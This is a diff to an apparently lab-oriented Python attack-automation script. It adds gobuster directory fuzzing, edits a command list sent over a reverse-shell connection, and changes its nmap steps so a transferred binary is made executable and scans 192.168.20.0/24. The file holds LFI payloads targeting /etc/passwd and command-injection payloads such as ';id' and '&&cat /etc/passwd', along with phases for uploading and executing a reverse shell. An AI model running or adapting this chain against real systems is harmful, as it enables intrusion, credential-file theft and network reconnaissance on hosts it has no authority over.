@@ -76,9 +76,9 @@ def handle_connection(client_socket, commands_to_execute):
             client_socket.send((command + "; echo '<<<CMD_DONE>>>'\n").encode('utf-8'))
             
             # Determine timeout based on command type
-            if 'nmap' in command or './scan.sh' in command:
-                initial_wait = 5  # Extra time for nmap to start
-                read_timeout = 60  # Longer timeout for nmap scans
+            if './nmap' in command:
+                initial_wait = 120  # Extra time for nmap to start
+                read_timeout = 120  # Longer timeout for nmap scans
             elif 'tar' in command or 'wget' in command:
                 initial_wait = 3
                 read_timeout = 30
@@ -187,6 +187,89 @@ LFI_PAYLOADS = ["../../../../etc/passwd", "../../windows/win.ini", "/proc/versio
 CMD_INJ_PAYLOADS = [";id", "|whoami", "&&cat /etc/passwd", ";ls"]
 
 # === Simulate Directory Scan + Follow-up Attacks ===
+def run_gobuster(target_url, wordlist_path=None):
+    """
+    Run gobuster directory fuzzing on target URL.
+    Waits for completion before returning.
+    """
+    import subprocess
+    
+    print("[+] Starting gobuster directory fuzzing...")
+    
+    # Use Kali's built-in wordlists if not provided
+    if not wordlist_path:
+        # Try common Kali wordlist locations in order of preference
+        kali_wordlists = [
+            '/usr/share/wordlists/dirb/common.txt',
+            # '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt',
+            # '/usr/share/seclists/Discovery/Web-Content/common.txt',
+            # '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt',
+            # '/usr/share/wordlists/wfuzz/general/common.txt',
+        ]
+        
+        # Find first available wordlist
+        for wl in kali_wordlists:
+            if os.path.exists(wl):
+                wordlist_path = wl
+                print(f"[*] Using wordlist: {wordlist_path}")
+                break
+        
+        # Fallback if no Kali wordlist found
+        if not wordlist_path or not os.path.exists(wordlist_path):
+            print("[!] No Kali wordlist found, creating minimal wordlist...")
+            wordlist_path = "/tmp/simple_wordlist.txt"
+            words = ['admin', 'login', 'config', 'backup', 'upload', 'uploads', 
+                     'files', 'index', 'home', 'about', 'contact', 'api', 'dashboard']
+            with open(wordlist_path, 'w') as f:
+                for word in words:
+                    f.write(word + '\n')
+            print(f"[*] Created fallback wordlist with {len(words)} entries")
+    
+    # Run gobuster
+    cmd = [
+        'gobuster', 'dir',
+        '-u', target_url,
+        '-w', wordlist_path,
+        '-x', 'php,html,txt',
+        '-q',  # Quiet mode
+        '-t', '20',  # 20 threads
+        '--timeout', '10s',
+        '--no-error'
+    ]
+    
+    print(f"[*] Running: gobuster dir -u {target_url} -w {wordlist_path} -x php,html,txt")
+    print("[*] Please wait for gobuster to complete...\n")
+    
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=300  # 5 minute timeout
+        )
+        
+        if result.returncode == 0:
+            print("[+] Gobuster completed successfully\n")
+            if result.stdout:
+                print(result.stdout)
+        else:
+            print(f"[!] Gobuster finished with warnings\n")
+            if result.stdout:
+                print(result.stdout)
+        
+        return True
+        
+    except subprocess.TimeoutExpired:
+        print("[!] Gobuster timeout after 5 minutes")
+        return False
+    except FileNotFoundError:
+        print("[-] Gobuster not found. Please install: sudo apt install gobuster")
+        return False
+    except Exception as e:
+        print(f"[-] Gobuster error: {e}")
+        return False
+
+
 def simulate_pentest_traffic():
     print("[+] Starting pentest traffic simulation...")
     session = requests.Session()
@@ -303,7 +386,7 @@ def execute_reverse_shell_attack(target_url, commands, send_file_callback=None):
     
     # Wait for command execution to complete
     print("[*] Executing commands...")
-    completion_event.wait(timeout=300)
+    completion_event.wait()
     
     print("[+] Command execution complete")
     print("="*60)
@@ -412,18 +495,18 @@ if __name__ == "__main__":
         "if [ -d /tmp/nmap_transfer/nmap-x64 ]; then ls -la /tmp/nmap_transfer/nmap-x64/; else echo 'Cannot list - directory does not exist'; fi",
         
         # Step 15: Make nmap executable (only if files exist)
-        "if [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then chmod +x /tmp/nmap_transfer/nmap-x64/scan.sh && echo 'scan.sh made executable'; else echo 'scan.sh not found'; fi",
+        "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then chmod +x /tmp/nmap_transfer/nmap-x64/nmap && echo 'nmap made executable'; else echo 'nmap not found'; fi",
         # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then chmod +x /tmp/nmap_transfer/nmap-x64/nmap && echo 'nmap made executable'; else echo 'nmap not found'; fi",
         
         # Step 16: Verify permissions
-        "if [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then ls -l /tmp/nmap_transfer/nmap-x64/scan.sh; fi",
+        "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then ls -l /tmp/nmap_transfer/nmap-x64/nmap; fi",
         # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then ls -l /tmp/nmap_transfer/nmap-x64/nmap; fi",
     ]
     
     # Step 17: Run nmap scans (reduced to essential scans only)
     COMMANDS.extend([
-        # Step 17a: Run scan.sh on localhost
-        "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./scan.sh 192.168.20.6 2>&1; else echo 'ERROR: Cannot run scan.sh - files not found'; fi",
+        # Step 17a: Run nmap on localhost
+        "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./nmap -sV 192.168.20.0/24 -vv 2>&1; else echo 'ERROR: Cannot run nmap - files not found'; fi",
         
         # Step 17b: Run simple nmap scan on localhost
         # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 1-1000 127.0.0.1 2>&1; else echo 'ERROR: nmap binary not found'; fi",
@@ -457,34 +540,43 @@ if __name__ == "__main__":
         # "rm -rf /tmp/nmap_transfer",
     ])
     
-    # === Step 1: Run pentest traffic simulation ===
+    # === Step 1: Run gobuster directory fuzzing ===
     print("\n" + "="*60)
-    print("[PHASE 1] PENTEST TRAFFIC SIMULATION")
+    print("[PHASE 1] DIRECTORY FUZZING WITH GOBUSTER")
     print("="*60)
-    simulate_pentest_traffic()
+    # run_gobuster(TARGET_BASE)
+    
+    print("\n[*] Waiting 3 seconds before pentest traffic simulation...")
+    time.sleep(3)
+    
+    # === Step 2: Run pentest traffic simulation ===
+    print("\n" + "="*60)
+    print("[PHASE 2] PENTEST TRAFFIC SIMULATION")
+    print("="*60)
+    # simulate_pentest_traffic()
     
     time.sleep(5)
     
-    # === Step 2: Upload reverse shell ===
+    # === Step 3: Upload reverse shell ===
     print("\n" + "="*60)
-    print("[PHASE 2] UPLOADING REVERSE SHELL")
+    print("[PHASE 3] UPLOADING REVERSE SHELL")
     print("="*60)
     
-    success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
+    # success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
     
-    if success and uploaded_path:
-        TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
-        print(f"[+] File accessible at: {TARGET_URL}")
-    elif success:
-        print(f"[+] File should be at: {TARGET_URL}")
-    else:
-        print("[-] Upload failed - continuing anyway...")
+    # if success and uploaded_path:
+    #     TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
+    #     print(f"[+] File accessible at: {TARGET_URL}")
+    # elif success:
+    #     print(f"[+] File should be at: {TARGET_URL}")
+    # else:
+    #     print("[-] Upload failed - continuing anyway...")
     
-    time.sleep(3)
+    # time.sleep(3)
     
-    # === Step 3: Execute reverse shell attack ===
+    # === Step 4: Execute reverse shell attack ===
     print("\n" + "="*60)
-    print("[PHASE 3] REVERSE SHELL ATTACK & ENUMERATION")
+    print("[PHASE 4] REVERSE SHELL ATTACK & ENUMERATION")
     print("="*60)
     results = execute_reverse_shell_attack(TARGET_URL, COMMANDS)
     
